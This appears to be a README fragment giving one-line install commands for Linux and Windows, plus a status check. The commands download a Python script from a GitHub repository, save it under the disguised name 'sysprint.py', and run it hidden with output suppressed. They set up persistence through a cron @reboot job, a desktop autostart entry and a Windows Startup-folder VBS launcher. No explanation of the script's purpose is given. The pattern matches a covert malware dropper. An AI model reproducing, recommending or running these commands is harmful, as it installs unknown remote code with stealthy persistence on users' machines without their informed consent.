### Linux
```bash
curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysprint.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysprint.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysprint.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=python3 %s\n' "$HOME/.local/bin/sysprint.py" > ~/.config/autostart/sysprint.desktop && nohup python3 ~/.local/bin/sysprint.py >/dev/null 2>&1 &
```

### Windows (PowerShell)
```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysprint.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysprint.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysprint.py" -WindowStyle Hidden
```

### Status Check

#### Linux
```bash
ps aux | grep sysprint.py
```

#### Windows
```powershell
Get-Process python*
```
